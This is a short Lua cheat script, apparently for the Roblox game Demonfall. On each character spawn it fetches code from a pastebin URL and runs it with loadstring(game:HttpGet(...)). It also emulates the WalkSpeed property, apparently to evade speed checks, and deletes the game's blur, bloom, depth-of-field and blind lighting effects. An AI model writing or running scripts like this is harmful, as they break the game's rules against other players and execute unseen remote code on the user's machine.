
_G.loool = true

local function sus()
    if _G.loool == true then
    loadstring(game:HttpGet("https://pastebin.com/raw/UwFCVrhS", true))()
game.Players.LocalPlayer.Character.Humanoid:AddPropertyEmulator("WalkSpeed")
    end
end

game.Players.LocalPlayer.CharacterAdded:Connect(sus)
sus()
wait()
--[[demonfall stuff]]
game:GetService("Lighting").Blur:Destroy()
game:GetService("Lighting").DepthOfField:Destroy()
game:GetService("Lighting").Bloom:Destroy()
game:GetService("Lighting").Blind:Destroy()
